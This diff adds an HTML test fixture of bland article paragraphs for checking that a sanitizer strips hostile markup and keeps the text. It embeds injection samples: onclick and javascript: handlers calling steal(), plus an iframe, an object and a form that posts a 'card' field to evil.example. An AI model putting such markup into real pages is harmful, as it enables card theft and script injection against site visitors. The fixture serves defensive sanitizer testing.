@@ -1,0 +1,37 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Harmless Looking Article</title>
+</head>
+<body>
+<script>trackers.push('pageview')</script>
+<article>
+  <h1>Harmless Looking Article</h1>
+  <p>MARKER_HOSTILE_LEDE This is a perfectly ordinary paragraph of article
+  copy, long enough and bland enough to score like real prose in the
+  extraction pipeline, carrying nothing more dangerous than punctuation and
+  the mild disappointment of a reader expecting insight.</p>
+  <p>The second paragraph continues in the same placid register, filling out
+  the document's text mass so the scorer treats this page as an article worth
+  keeping rather than a stub to decline on sight.</p>
+  <p onclick="steal()">This paragraph carries an event handler that must not
+  survive sanitization even though its text is ordinary article filler.</p>
+  <a href="javascript:steal()">a poisonous link</a>
+  <img src="javascript:steal()" alt="poison pixel">
+  <iframe src="https://evil.example/frame"></iframe>
+  <form action="https://evil.example/collect"><input name="card"></form>
+  <object data="https://evil.example/x.swf"></object>
+  <p>A fourth paragraph of unremarkable copy to pad the article's length past
+  every heuristic threshold, confirming that the hostile elements above are
+  passengers inside an otherwise extractable document.</p>
+  <p>And a fifth, because real articles rarely stop at four paragraphs, and
+  the test needs enough surviving text to prove the sanitizer cut the markup
+  without cutting the story along with it.</p>
+  <p>MARKER_HOSTILE_TAIL The closing paragraph signs off the way articles do,
+  with a final sentence that exists mostly to be remembered by the assertion
+  that comes looking for it.</p>
+</article>
+<script>beacon.fire()</script>
+</body>
+</html>
